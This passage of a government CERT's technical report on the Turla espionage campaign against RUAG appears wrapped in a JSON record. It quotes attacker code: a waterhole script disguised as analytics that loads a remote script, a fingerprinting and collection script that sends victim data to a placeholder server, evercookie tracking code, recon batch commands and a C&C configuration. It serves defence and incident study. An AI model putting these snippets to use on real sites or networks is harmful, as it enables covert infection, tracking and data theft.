{
    "id": "e52514c7-8063-4d7d-a239-5917505fe802",
    "created_at": "2022-10-25T16:48:22.325159Z",
    "updated_at": "2025-03-27T02:16:20.650428Z",
    "deleted_at": null,
    "sha1_hash": "dbee63b0f8cd29139b4d12b867e3a80de139c0df",
    "title": "APT Case RUAG Technical Report",
    "authors": "GovCERT.ch",
    "file_creation_date": "2016-05-19T12:21:55Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 1856974,
    "plain_text": "MELANI:GovCERT TLP WHITE\n\n# APT Case RUAG\n\n## Technical Report\n```\nAuthor: GovCERT.ch\nDate: 23rd May 2016\nTLP: WHITE\nTopic: Technical Report about the Espionage Case at RUAG\n\n```\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n### Content\n\n**Summary** **1**\n\n**Introduction** **2**\n\nThe Case . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\n\nThe Chronology . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2\n\nThe Malware Family . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\n\n**Modus Operandi** **4**\n\nVictim Evaluation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\n\nInfecting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 5\n\nActive Infection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 8\n\nTrojan Supported Reconnaissance . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9\n\nGaining Information and the Task Format . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\n\nGaining Final Persistence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12\n\nA Closer Look at the Encryption Algorithms Used in Carbon-DLL and Tavdig . . . . . . . . 15\n\nLateral movement . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21\n\nData Exfiltration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\n\n**Recommendations** **27**\n\nSystem level . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\n\nActive Directory . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\n\nNetwork level . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\n\nLog files . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28\n\nSystem Management . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28\n\nOrganization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28\n\n**Conclusion** **29**\n\n**Appendix IOCs** **31**\n\nURLs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n\nMD5 Hashes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n\nExternal References . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n### Summary\n\nThe RUAG cyber espionage case has been analyzed by GovCERT in order to provide insight and protection.\nWe decided to publish this report to give organizations the chance to check their networks for similar\ninfections, and to show the modus operandi of the attacker group.\n\nThe attackers have been using malware from the Turla family, which has been in the wild for several years.\nThe variant observed in the network of RUAG has no rookit functionality, but relies on obfuscation for\nstaying undetected. The attackers showed great patience during the infiltration and lateral movement. They\nonly attacked victims they were interested in by implementing various measures, such as a target IP list and\nextensive fingerprinting before and after the initial infection. After they got into the network, they moved\nlaterally by infecting other devices and by gaining higher privileges. One of their main targets was the active\n_directory, as this gave them the opportunity to control other devices, and to access the interesting data by_\nusing the appropriate permissions and group memberships. The malware sent HTTP requests to transfer the\ndata to the outside, where several Command-and-Control (C&C) servers were located. These C&C servers\nprovided new tasks to the infected devices. Such tasks may consist of new binaries, configuration files, or\nbatch jobs. Inside the infiltrated network, the attackers used named pipes for the internal communication\nbetween infected devices, which is difficult to detect. This way, they constructed a hierarchical peer-to-peer\n_network: some of these devices took the role of a communication drone, while others acted as worker drones._\nThe latter ones never actually contacted any C&C servers, but instead received their tasks via named pipes\nfrom a communication drone, and also returned stolen data this way. Only communication drones ever\ncontacted C&C servers directly.\n\nIt is difficult to estimate the damage caused by the attackers; this is by any means beyond the scope of\nthis report. However, we observed interesting patterns in the proxy logs. There were phases with very few\nactivity, both in terms of requests and amount of data transferred. These quiet phases were seperated by\nhigh-activity periods with many requests and big amounts of exfiltrated data.\n\nAt the end of the report, we provide some recommendations and countermeasures we consider most effective\nagainst this kind of threat on the level of end-devices, the active directory, and the network. It is important\nto mention that many countermeasures are not cost-intensive, and can be implemented with reasonable\namount of work. Even if it is difficult to completely protect an organization against such actors, we are\nconfident that they are detectable, as everyone makes mistakes. The defending organization must be ready\nto see such traces, and to share this information with other parties, in order to follow such attackers closely.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n### Introduction\n\nThe following is a short report with the intention to inform the public about Indicators of Compromise\n(IOCs) and Modus Operandi of the attacker group that is responsible for the RUAG cyber espionage\n**case, which has been made public on Wednesday, May 4th 2016.**\n\nOne of the main tasks of MELANI is to support critical infrastructures during security incidents and the coordination of relevant actors involved. Regarding technical first response and support, GovCERT supported\nRUAG with log analysis, forensics, malware reverse engineering and security monitoring. The report below\nreflects our experiences during this case.\n\n#### The Case\n\nThe cyber attack is related to a long running campaign of the threat actor around Epic/Turla/Tavdig. The\nactor has not only infiltrated many governmental organizations in Europe, but also commercial companies\nin the private sector in the past decade. RUAG has been affected by this threat since at least September\n2014. The actor group used malware that does not encompass any root kit technologies (even though the\nattackers have rootkits within their malware arsenal). An interesting part is the lateral movement, which\nhas been done with a lot of patience. The intention of the attackers is always to steal information from the\nvictim. In order to this, they infiltrate the network and then move laterally, until they are able to retrieve\nthe information of interest.\n\nWe would like to emphasize that public blaming is never appropriate after such attacks. These attacks may\nhappen to every organization regardless of their security level. What is much more important is to learn\nfrom these attacks and to raise the bar for the next time the attacker tries to infiltrate the network.\n\n#### The Chronology\n\nThe picture below shows the chronology of the attack against RUAG.\n\nFigure 1: Timeline of Attack\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n#### The Malware Family\n\nThere are many names used in the context of this malware family. The most generic one is Turla, which is\nconsidered as the name for the whole family - some also call it Uroburos, though this is not strictly correct.\n\nThe following picture tries - in an extremely simplified manner - to summarize the involved trojan names:\n\nFigure 2: Turla Family Tree\n\nThis overview is not complete, but most commonly known names should be present. The common ancestor\nseems to be Agent.BTZ, which was first observed in 2007 and 2008 in the US. The roots of Agent.BTZ are\na bit vague, and also code relations to the rest of the family are not very obvious. For these reasons, the\nrelations are shown as dotted lines. Surprisingly, some more obvious links can be found between Agent.BTZ\nand the much newer Snake rootkit - like a common XOR key used in both of them. The relation to Carbon\nis weaker though. So, Agent.BTZ must be considered as a vague origin of the whole family. It is not really\nknown how old Agent.BTZ is, but we assume it’s actually older than 2007.\n\nThe Carbon rootkit was the first real member of the family, first observed in 2007. It initially came as a\n32-bit kernel driver under Windows XP, and 2 years later as a 64-bit kernel driver.\n\nAfter Microsoft enforced digital signatures for kernel drivers on their 64-bit operating systems, the Carbon\nrootkit was replaced by a usermode only variant, purely using DLLs and hence named Carbon-DLL.\nCarbon-DLL also added asymmetric encryption for C&C (Command and Control) traffic.\n\nThe famous Snake rootkit (also called Uroburos) seems to be a spin-off of the Carbon rootkit. It also is\na rootkit, using an exploit in a digitally signed VMWare driver, but it lacks the advanced cryptography of\nCarbon-DLL. So it does not look like a direct successor.\n\nShown in green boxes are the corresponding recon tools (more details about these in the “Active Infection”\nchapter later). Recon tools are a bit like poor-man’s-versions of their counterparts and are used as initial\ninfections to have a first look on freshly infected systems. As the attackers have only limited control on\nwhich systems actually get successfully infected, it is useful for them to have a closer look before sending the\nfinal infection malware (which we call stage 2 malware).\n\nThe only well known member of these recon tools is Tavdig, also known as Wipbot or Epic. It has a\npredecessor, which was never broadly published about; we call it regbackup, because this is the name\nunder which it was installed.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n### Modus Operandi\n\nGovCERT uses the following model to describe the actions of APT actors. Basically it is a simplified\napproach of the Cyber Kill Chain model proposed by Lockheed.\n\nFigure 3: Phases of the Attack\n\nWe distinguish the following phases:\n\n1. Victim evaluation: During this phase, the attacker tries to get as much information about the target\nas possible. It is a preparation for the actual attack and covers at least the IP ranges, platforms and\nsome usage patterns of their users. It is important for him to place the right waterholes and to be able\nto filter out unwanted victims from the actual targets. This phase is divided into several sub phases,\nnot all need to be necessarily be in place:\n\n  - Passive information gathering\n\n  - Active scanning\n\n  - Preparing waterholes\n\n2. Infecting: The infection phase consists of a fingerprint of the victim in order to find the best suited\ninfection method (using an appropriate exploit or a social engineering technique). It has the following\nsub phases:\n\n  - Activating waterholes / sending spearphishings\n\n  - Fingerprinting: This is most often done using JavaScript\n\n  - Exploiting: Depending on the target, a suitable exploit is chosen. If this is not feasible, a social\nengineering approach is applied.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n3. Active Infection: The attacker is now in the network. There are several sub phases here:\n\n  - Trojan supported Reconnaissance: We often see an initial reconnaissance tool being placed, performing\nadditional reconnaissance actions from within the network of the victim. This tool has not many\ncapabilities, but can be replaced by a more powerful malware at any time.\n\n  - Gaining Persistence: If the recon tool has been placed successfully and has sent out enough information,\nit is replaced by the actual malware with more functionality and deeper persistence in the system and\nthe network.\n\n  - Lateral Movement: The attacker begins to move laterally in order to gain access to the information\nhe is interested in. Lateral movement is often done by using “normal” tools that are also used for\nmanaging systems. The lateral movement also comprises the collection of credentials, as well as the\nelevation of privileges.\n\n  - Data Exfiltration: As soon as the attacker begins to steal data, he must transport it outside of the\nnetwork without being discovered. This is often done by first compressing the data and then sending\nit out, piece by piece.\n\nSome of these phases are overlapping, and the attackers repeat phases if necessary; e.g. if they do not\nmanage to get a certain piece of information due to the lack of privileges, they are forced to repeat the\nlateral movement.\n\nIn the following chapters, we are going to discuss the different phases in more detail.\n\n#### Victim Evaluation\n\nEven though we do not have much data about the attacker during this and the next phase, we are going to\ndescribe his actions in a more general way, based on findings we made during other incidents. Reconnaissance\nactivities also involve the preparation of waterholes. Vulnerable web servers on the Internet serve him not\nonly as waterholes, but also as first-level C&C servers.\n\n#### Infecting\n\nUnfortunately, log files at RUAG only go back until September 2014, where we still see C&C activity.\nAdditionally, many suspicious devices have been reinstalled in the meantime; Hence we cannot determine\nthe initial attack vector. However, we know from other cases the modus operandi of this actor group, which\nwe’ll describe in the following paragraphs.\n\nBefore infecting a device, the attacker does an extensive fingerprinting. They only infect a device after being\ncertain it is suited for their purposes. In the case of waterholes, they do it as follows:\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nFigure 4: Chain of Infection\n\n1. The waterhole just contains a redirection to the actual infection site. This redirection can vary. We\nobserved URL shorteners as well as JavaScripts disguised as Google Analytics scripts.\n2. The infection site tests whether the victim’s IP address is on a target list; if so, a fingerprinting script is\nreturned. The result of it is sent back to the same server, where it is manually checked by the attacker.\nOnly after a certain time, the attacker decides, whether the device shall be infected, either by sending\nan exploit, or by using social engineering techniques.\n3. If the infection is successful, a first connection to a C&C server is made.\n\nHere is an example of such a camouflaged JavaScript:\n\n1 document.getElementsByTagName(\"body\")[0].onmousemove = function() {\n\n2 if (document.getElementById(\"xyz\")) {} else{\n3 `var gam = document.createElement('script');`\n\n4 `gam.type = 'text/‘javascript;`\n5 `gam.async = true;`\n\n6 `gam.src = ('https:' == document.location.protocol ? 'http://goo.gl' :`\n7 `'http://goo.gl') + '/GLmcrx';`\n\n8 `var sm = document.getElementsByTagName('script')[0];`\n9 `sm.parentNode.insertBefore(gam, sm);`\n\n10 `var fl = document.createElement('span');`\n\n11 `fl.id = 'xyz';`\n12 `var d = document.getElementsByTagName('div')[0];`\n\n13 `d.parentNode.insertBefore(fl, d);}`\n\nThe attacker maintains a target list of network ranges he’s interested in. An initial script is delivered in\norder to collect basic information, such as the external IP address, or the current date and the time on the\ncomputer of the victim:\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n1\n\n2 var returnUrl = 'SERVERADDRESS/?cart_id=DD&' + 'mode=collect'; var returnData = \"\";\n3 var returnDataType = \"\";\n\n4 myResults['123'] = \"Hello\"; myResults['456'] = \"xxx.xxx.xxx.xxx\";\n5 sendComplete();\n\n6 function sendComplete() {\n7 myResults['dateEnd'] = (new Date).toString(); myResults['content'] = \"\";\n\n8 Collection['title'] = \"Image\";\n9 Collection['content'] = utf8_to_b64(JSON.stringify(myResults)); Collection['type'] = \"jpeg\";\n\n10 Collection['index'] = \"143000\";\n11 Collection['checksum'] = \"169739e7211295146a61d300c0fef02d\"; returnData =\n```\n   JSON.stringify(Collection);\n\n```\n12 returnDataType = 'application/json';\n\n13 sendResult(); }\n```\n DD stands for a two digit value.\n\n```\nIf the IP address matches a network range on the target list, the next step is a more sophisticated fingerprinting script. The fingerprinting scripts gains as much information about the victim as possible by using\n[JavaScript. It is taken from the BEEF framework (Browser Exploitation Framework BEEF, beefproject.com).](http://beefproject.com/)\n\nA small extract of this script shows the technique:\n\n1 PluginDetect.getVersion(\".\");\n\n2 var jaid = PluginDetect.getVersion(\"Java\");\n3 var fid = PluginDetect.getVersion(\"Flash\");\n\n4 var aid = PluginDetect.getVersion(\"AdobeReader\"); if (aid == \"null\") {\n\n5 var aid = PluginDetect.getVersion(\"PDFReader\") }\n6 var sid = PluginDetect.getVersion(\"Shockwave\"); var mid = \"null\";\n\n7 var rid = \"null\";\n8 var rid = document.referrer;\n\n9 if (rid == null || rid.length == 0) { rid = \"null\"\n10 }\n\n11 mid = COV();\n12 var feedback_link = \"SERVERADDRESS?cart_id=DD\";\n\n13 var cartid = \"DD\";\n14 var myjq = jQuery.noConflict(true);\n\n15 req()\n\nThe fingerprinting scripts also marks any device that has been fingerprinted with an evercookie. An\n[evercookie is a cookie, which uses any method available to make a device identifiable, even if the user deletes](http://samy.pl/evercookie/)\nstandard cookies. Evercookies also use the possibilities offered by LSO (Local Storage Objects) and plugins\nlike Flash or Silverlight.\n\nThe following code snippet shows, how an evercookie is created:\n\n1 if (s === 0) {\n2 `N.evercookie_database_storage(n, i);`\n\n3 `if (a.silverlight) {`\n4 `N.evercookie_silverlight(n, i)`\n\n5 `}`\n6 `if (a.authPath) {`\n\n7 `N.evercookie_auth(n, i)`\n8 `}`\n\n9 `if (b) {`\n10 `N.evercookie_java(n, i)`\n\n11 `}`\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n12 `N._ec.userData = N.evercookie_userdata(n, i);`\n\n13 `N._ec.cookieData = N.evercookie_cookie(n, i);`\n14 `N._ec.localData = N.evercookie_local_storage(n, i);`\n\n15 `N._ec.globalData = N.evercookie_global_storage(n, i);`\n16 `N._ec.sessionData = N.evercookie_session_storage(n, i);`\n\n17 `N._ec.windowData = N.evercookie_window(n, i);`\n18 `if (m) {`\n\n19 `N._ec.historyData = N.evercookie_history(n, i)`\n20 `}`\n\n21 `}`\n\nIf the fingerprinting suggests a high probability of a successful infection, a payload containing an exploit, or\ntrying to trick the user into executing a seemingly legitimate binary, e.g. a JavaInstaller, is returned.\n\n#### Active Infection\n\nThe picture below depicts the trojans of the Turla malware family used after a successful infection in more\ndetail:\n\nFigure 5: Turla Timeline\n\nFor an infection on a victim system (also called a bot), two stages are passed through. At a first stage, a\nsystem is infected by a reconnaissance malware; we call this a recon tool. Recon tools are shown as green\ncircles. Their main purpose is to figure out whether the infected system is interesting enough. Should this be\nthe case, the full-fledged stage 2 malware is added, and ultimately persistence is gained. This will be a much\nmore elaborate malware which implements more features. Stage 2 trojans usually run under administrative\nprivileges, so they require the additional step of a privilege escalation.\n\nNote that the recon tool is not always removed after the stage 2 trojan has been installed. We observed\nsystems with both stages active on simultaneously. Recon tools are sometimes also used to attack further,\nat this point still clean systems, to directly install a stage 2 trojan on them. This usually requires the use\nof an exploit (privilege escalation) on the target system, or - more commonly - the knowledge of credentials.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nAs a consequence, an infected network can contain bots infected with only recon tools, only stage 2 trojans,\nboth of them, or - hopefully the major part - none of them.\n\nThe picture also shows a purple circle, dated 2011 and named Unix backdoor. This is actually a completely\ndifferent code, but it was used by the same attackers in 2011. It’s main working principle is to sniff all packets\non the wire, to check their payload for some mathematical markers left there by the attackers, and finally\nto back-connect to an IP address encoded in these markers; this is somehow comparable to the “tainting”\nmechanism Snake used several years later. In the end, this is a type of RAT (Remote Access Tool). It even\ncontains a feature to access a linear filesystem at a third IP address (like a file repository), but we never\nfound the corresponding server implementation. It uses Diffie Hellman and Blowfish for communication.\nOne interesting observation about it is the use of a (non-secret) prime number p in the Diffie-Hellman\n[implementation, which already appeared in a project called LOKI2, published 1997 in the Phrack magazine.](http://phrack.org/issues/51/6.html)\nLOKI2 was a program to exfiltrate data via covered channels, like DNS or ICMP. In our opinion, the code was\nderived from the LOKI2 implementation, and the attackers most probably have other LOKI2-like programs\nin their arsenal. Note that Kaspersky named this malware Turla Unix variant later on.\n\nA common feature of recon tools, as well as of stage 2 trojans, is that they don’t run in dedicated processes,\nbut inject themselves into already existing processes, where they live as additional threads. This way, no\nadditional processes becomes visible in a running system. We’ll examine this mechanism in the next section.\n\nWe differentiate 2 phases after a successful infection: a trojan supported reconnaissance phase while the recon\ntool is used, and the final persistence phase after the stage 2 malware is installed.\n\n**Trojan Supported Reconnaissance**\n\nRecon tools show some simplifications, in contrast to stage 2 malware:\n\n  - They run in the context of a normal user, without additional privileges. Other users logging in on the\nsame system are not directly affected.\n\n  - They are started whenever the infected user logs in, using a standard mechanism, like autostart folders\nor winlogon registry keys.\n\n  - Main functionality: Execution of batch scripts or executables. Recon tools often also collect some\ngeneric system information every time they are started.\n\n  - Recon tools are usually single-threaded. Received binaries and scripts are executed immediately,\nand the results are also returned immediately. No concurrent execution is possible.\n\n  - No additional features like key loggers, plugins or peer to peer functionalities.\n\n  - No separate configuration file, their configuration is completely hardcoded. Any changes - like C&C\nserver updates - require exchanging the whole binary.\n\n  - Usually no unique trojan ID is used, or such an ID is volatile (this is not true in all cases).\n\nRecon tools are used by the attackers to have a closer look at a particular system, usually for a few days\nor weeks. They can also be considered as giveaway trojans: in case a system is detected at this stage of\ninfection, the attackers don’t loose too much, as the more advanced stage 2 trojan was not yet revealed. This\nof course is only true as long as a stage 2 trojan is not yet discovered and published about.\n\nAs mentioned above, the main functionality is the execution of batch scripts or binaries. We’re using the\nmore generic term of a task for this. A task is a data blob (binary large object) sent by the C&C server\nto an infected bot containing an instruction (or several instructions) to be executed by a target. The bot\neither immediately executes this task and sends the result back, it queues the task for later execution, or it\nforwards the task to another bot to do the same. In the case of recon tools, these tasks are very simple and\ncan only contain binaries or batch scripts to execute. No queuing or forwarding is supported for recon tools.\nWe’ll have a closer look on the task format in the next section “Gaining Information and the Task Format”.\n\nHistorically, the first actual implementation of a recon tool was observed back in 2007. This was a rather\nsimple program using the name regbackup.exe (that’s also how we called it at the time), pretending\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nto be a service for a registry backup. Traffic between C&C servers and bots were encrypted using the\n[symmetric CAST128 algorithm in OFB mode with a hardcoded key. The key was hardcoded, no peer to](https://de.wikipedia.org/wiki/Output_Feedback_Mode)\npeer functionality was implemented.\n\nIn 2011, we observed an evolved version of the recon tool, which was later documented by Kaspersky under\nthe name Tavdig (sometimes also called Wipbot or Epic, these are all the same thing). Basically it’s very\nsimilar to regbackup. The main evolution is a more advanced binary packer, which actually doesn’t even\nunpack into a standard PE format file, but into a proprietary format (we call it BAD format because it’s using\nhex values 0B AD as marker number instead of \"PE\"). Furthermore, encryption was replaced by ElGamal\nencryption, which is a public private scheme - more technical details about this later on. The code contains\nthe public key of the server, and a private key.\n\nAs described above, recon tools use an injection mechanism, like most other members of the malware\nfamily. In the case of Tavdig, this is how it works:\n\nFigure 6: Tavdig Injection\n\nIn this illustration, time runs from top to down, starting after the login of an infected user. Tavdig is then\nstarted and running for a short time in its own process (orange box), for instance via the Winlogon registry\nkey. It then injects a guard thread into a process that won’t be stopped, until the user logs out, typically\none of the svchost.exe processes. This thread is shown as a red stripe. The guard thread itself only acts\nin the background: It contains a list of process names typical for web browsers, mail and IM clients, and\nother internet applications. Every process in the bot matching one of these names becomes a target process.\nThe guard thread permanently searches for such target processes. As soon as one is found, e.g. if the user\nstarts a web browser, a work thread is injected. The work thread is doing the main work: it contacts the\nC&C servers and executes tasks. The guard thread makes sure that only one work thread is running at the\nsame time, and it initiates the start of a new work thread if the old one terminates, e.g. after the victim\ncloses its web browser. This happens immediately, if another target process is still running. But it can also\nhappen later on, as soon as a new target process is started by the victim. This way, only processes that\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\ntypically connect to the internet try to contact C&C servers; This fools local firewalls, which usually filter\ntraffic based on the originating process, but this also makes detection in proxy logs harder, as C&C traffic\nis mixed with legitimate traffic. One side effect is Tavdig not to become active before the user starts his\ninternet browser or mail client or any other program connecting the internet. Note that all members of the\nTurla family are proxy aware: unlike many E-banking trojans, they also work behind firewalls.\n\nOne drawback for the attackers, at least in the case of recon tools, is that tasks can get lost, namely if a task,\nwhich takes some time for execution, is received, and the victim closes the browser before the task has been\nfinished and results are sent back. There is no queueing mechanism, so the task won’t be executed again in\nthe next started work thread. Second stage trojans solve this problem by more complex setups.\n\n**Gaining Information and the Task Format**\n\nAs mentioned earlier above, tasks appear in a specific container format. In case of Carbon-DLL, it roughly\nlooks like this:\n\nByte Offset Meaning\n\n0 Task-ID\n\n4 Length f of routing blob\n\n8 routing blob\n\n_f_ +8 Task-code\n\n_f_ +12 Length l of task payload\n\n_f_ +16 payload (e.g. a batch script)\n\n_f_ +l+16 Length c of config data\n\n_f_ +l+20 config data\n\nFigure 7: Task Format\n\nFirst, every task has a unique task ID, which is also returned together with the results. This is important,\nbecause it allows the attackers to link results and tasks.\n\nThe routing blob can contain one or more trojan IDs of the next hop, combined with transport information\n(TCP plus address, or a named pipe, potentially with authentication). Every hop removes one element of\nthis routing blob before forwarding to the next, and as soon as the routing blob is empty, the bot knows it\nis the one to execute the task.\n\nWhen a task is executed, the task-code is checked. The remaining data format depends on this code. It\nusually is 0, which means the execution of a standard task - this is also the format shown in the table. In\nthis case, two blobs follow: the payload and the config data. Here is the example of a payload, which is a\nbatch script, in this case a typical initial recon activity:\n\n1 ipconfig -all\n\n2 netstat -r\n3 netstat -an\n\n4 nbtstat -n\n5 nbtstat -s\n\n6 net share\n7 net file\n\n8 net session\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n9 net use\n\n10 net group\n11 net view\n\n12 net config\n13 systeminfo\n\n14 net time \\\\127.0.0.1\n\nBut the bot still needs to know what to do with this. This is what the config data - always plain text - is\nfor. It might look like this:\n\n1 [CONFIG]\n\n2 name = %TEMP%\\sysh32.bat\n\n3 exe = cmd.exe /c \"%TEMP%\\sysh32.bat\"\n\nThis example means that the bot should to the following steps:\n\n1. store the payload in the file %TEMP%\\sysh32.bat\n2. execute the command cmd.exe /c \"%TEMP%\\sysh32.bat\" (using CreateProcess) - so this will actually execute the payload as a batch script (/c option)\n3. remove %TEMP%\\sysh32.bat (the payload file is always automatically removed)\n4. the standard output is returned to the C&C server\n\nThere are special parameters in regard what to return, for example the content of some file instead of the\nstandard output, or how to deal with standard error.\n\nA similar binary format exists for the returned task results.\n\nIf the task-code is between 1 and 99, a special task is executed (it also means that the rest of the container\nformat changes accordingly). Some of these tasks require sub-task-codes. Some of these special tasks are:\n\n   - 55: update (a sub-task-code tells what to update, like which binary, or the config file)\n\n   - 57: install a plugin\n\n   - 62: install the server public key - this will also generate a new private bot key\n\nThe format described is used by Carbon-DLL. Tavdig is using a similar, but simplified format. It mainly\nlacks the routing blob and task-code (it implicitly is 0). But Tavdig also includes task-IDs.\n\n**Gaining Final Persistence**\n\nBy adding a second stage malware to an infected system, final persistence is gained:\n\n   - They usually run under administrator privileges and require a privilege escalation.\n\n   - They are started in more complex ways at boot up time, typically using a service, or - in the case of\nrootkits - kernel drivers.\n\n   - They also allow the execution of batch scripts and binaries in their tasks, but often also support\n**plugins like key loggers and activities like taking screenshots.**\n\n   - They are usually multi-threaded. Received tasks are not immediately executed, but queued and\nlater on executed via another thread, usually even running in a different process.\n\n   - They use named pipes and mutexes to coordinate the different threads.\n\n   - They do have a separate configuration file that allows incremental updates\n\n   - They always install a unique trojan ID for every infected system\n\n   - They support peer-to-peer functionality: tasks can be forwarded to other bots for execution.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nThis peer-to-peer functionality is a very important additional feature of the stage 2 malware. This means\nthat a bot is able to receive a task from it’s C&C server(s) and route it to another infected bot in the local\nnetwork; results are sent back using the same path in the reverse direction. To facilitate this feature, every\ninfected bot gets a unique trojan ID at infection time, and every task contains initial routing information,\npotentially even using several intermediate hops, but we never actually observed tasks with more than two\nhops. The peer-to-peer network uses different methods for communication, very common are named pipes,\nbut also direct TCP connections are possible. These relations are shown in the following illustration:\n\nFigure 8: Hierarchical Structure of the Botnet\n\nThe first actual stage 2 trojan appeared around the same time as the corresponding recon tool, though we\nonly discovered it some time later. The programmers called it Carbon in the configuration file, so we also\nuse this name; another name for it, derived from a PDB string, is Cobra (a type of snake, but this is not the\nSnake rootkit). It came as a rootkit and added peer-to-peer functionality, but otherwise didn’t implement\nmore elaborate functions. It used the same cryptographic algorithm as the recon tool, and also the same\nhardcoded key. As a rootkit, it had a component running in kernel mode, and 2 components running in user\n_mode (one for C&C communication, and one for task execution). The kernel mode component tried to hide all_\nactivities from system monitoring, and in addition implemented an encrypted, virtual file store (VFS).\nThe VFS was realized as 100 MB file (hidden by the rootkit) with an NTFS filesystem on it. CAST128\nwas also used for encryption of the VFS, but in a different encryption mode (CBC), with IVs derived from\nthe block index, and a different hardcoded key. This VFS was used to store the user mode components, a\nconfiguration file, received (and not yet executed or forwarded) tasks, results not yet sent out, and logging\ninformation. Also a volatile virtual storage was implemented (like a RAM disk) for intermediate task results.\nThe rootkit was very advanced for its time, and is a clear ancestor of the well known Snake rootkit. In 2009,\nwe also found 64 bit implementations of the rootkit. There was no digital signature required at this time,\nnot even on 64 bit systems; the later Snake rootkit used digitally signed, vulnerable VMware drivers as a\ncarrier (vboxdrv.sys), as documented in several papers published in the past years.\n\nThe configuration file was a simple text file, in later versions it was additionally CAST-encrypted. Here\nis an (anonymized) example for such a configuration file:\n\n1 [NAME]\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n2 object_id=1c2e30cd-abb3-41ef-a74d37\n\n3\n4\n\n5 [TIME]\n6 user_winmin = `700000`\n\n7 user_winmax = 1200000\n8 sys_winmin = 1800000\n\n9 sys_winmax = 1900000\n10 task_min = 30000\n\n11 task_max = 40000\n12 checkmin = 60000\n\n13 checkmax = 70000\n14 logmin = `600000`\n\n15 logmax = 1200000\n16 lastconnect=1223023515\n\n17 timestop=\n18 active_con = 900000\n\n19\n20 [CW_LOCAL]\n\n21 quantity = 0\n22\n\n23 [CW_INET]\n24 quantity = 2\n\n25 address1 = 1.2.3.4:80\n26 address2 = 5.6.7.8:80\n\n27\n28 [TRANSPORT]\n\n29 user_pipe = \\\\.\\pipe\\userpipe\n\n30 system_pipe = \\\\.\\pipe\\iehelper\n31\n\n32\n33 [DHCP]\n\n34 server = 135\n35\n\n36\n37 [LOG]\n\n38 lastsend =1223021515\n39 logperiod = 7200\n\n40\n41 [WORKDATA]\n\n42 run_task=\n43 run_task_system=\n\n44 [VERSION]\n45 System=Carbon v1.53\n\n46 User=Carbon v1.42\n\nIn the CW_INET section, we see the C&C servers. Several can be configured, they are selected using the\nround robin method. Bots that do not contact C&C servers directly lack this section. CW_LOCAL is then used\ninstead. TRANSPORT defines the internal named pipes for communication between the different threads on an\ninfected bot.\n\nThe injection mechanism is more complex than the one of Tavdig, but follows the same basic principle. As\na main difference, named pipes are used to communicate between the active threads. Typically, the thread\ninjected into the web browser now is only responsible for C&C communication (and so can be called comm\n**thread); received data, and data queued to be sent out, is stored in the VFS as dedicated files. The work**\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nthread, however, lives in a long-living process, like explore.exe, and executes tasks received by the comm\nthread. This means that receiving a task, executing a task, and sending out the results are decoupled, using\na file system in between and named pipes for synchronization. This makes the setup far more reliable, tasks\ncan’t easily get lost anymore. Besides named pipes, mutexes are also required to avoid race conditions.\nThis is also a disadvantage, it results in a more complex setup and easier detection due to pipe and mutex\nnames.\n\nAnother drawback is the limited size of the VFS (100MB). Tasks - and mainly task results - can’t be larger\nthan this.\n\nIn 2012, we discovered a new Carbon variant. The main difference to the original Carbon from 2007 was it’s\n_lack of rootkit features and lack of VFS. It was only implemented as 2 usermode DLLs (implementing the_\nsame functionality as the original usermode DLLs), and a simple service binary started via the registry, but\nof course under administrative privileges. That’s why we call it Carbon-DLL. The VFS was replaced by\njust using a random, already existing directory under the program directory tree, and encryption is realized\nby just CAST128-encrypting all single files in this working directory. The path of this working directory is\nstored in a random .inf file, using the hard disk serial number as fingerprint. So all the rootkit’s hiding\nfunctions were replaced by obfuscation functions. Technically, this is more basic than using a rootkit, and\nit could be called a step backward - we assume the programmers were forced to do this due to Microsoft\nrequiring kernel mode drivers to be digitally signed around this time. But it is also an advantage, because it\nmakes the infection more stable, and in some way harder to detect, as there are no hidden files that suddenly\nbecome visible in safe mode. Also the problem with limited VFS 